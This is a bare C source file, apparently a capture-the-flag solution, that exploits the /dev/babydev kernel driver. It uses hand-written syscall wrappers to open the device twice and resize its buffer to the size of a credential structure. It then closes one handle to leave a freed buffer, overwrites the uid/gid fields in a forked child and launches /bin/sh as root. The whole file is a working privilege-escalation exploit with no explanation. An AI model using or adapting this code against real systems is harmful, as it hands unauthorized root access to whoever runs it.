int read(int fd, void *buf, unsigned long count) {
    __asm__("mov rax, 0");
    __asm__("syscall");
}

int write(int fd, const void *buf, unsigned long count) {
    __asm__("mov rax, 1");
    __asm__("syscall");
}

int open(const char *pathname, int flags) {
    __asm__("mov rax, 2");
    __asm__("syscall");
}

int close(int fd) {
    __asm__("mov rax, 3");
    __asm__("syscall");
}

int ioctl(int fd, unsigned long request, ...) {
    __asm__("mov rax, 16");
    __asm__("syscall");
}

int fork(void) {
    __asm__("mov rax, 57");
    __asm__("syscall");
}

int execve(char *filename, char *const argv[], char *const envp[]) {
    __asm__("mov rax, 59");
    __asm__("syscall");
}

void exit(int status) {
    __asm__("mov rax, 60");
    __asm__("syscall");
}

int wait4(int pid, int *wstatus, int options, void *rusage) {
    __asm__("mov rax, 61");
    __asm__("syscall");
}

int getuid(void) {
    __asm__("mov rax, 102");
    __asm__("syscall");
}

void run_shell(void) {
    char *args[2] = {"/bin/sh"};
    execve(args[0], args, 0);
}

void _start(void) {
    int fd = open("/dev/babydev", 2);
    int fd2 = open("/dev/babydev", 2);
    ioctl(fd, 0x10001, 0xa8);
    close(fd2);

    int pid = fork();
    if (pid == 0) {
        unsigned int buf[0xa8/4];
        read(fd, buf, 0xa7);
        if (buf[1] == 1000) {
            for (int i = 0; i < 8; i++) {
                buf[i+1] = 0;
            }
            write(fd, buf, 4*9);
            run_shell();
        }
    } else {
        wait4(pid, 0, 0, 0);
    }

    exit(0);
}
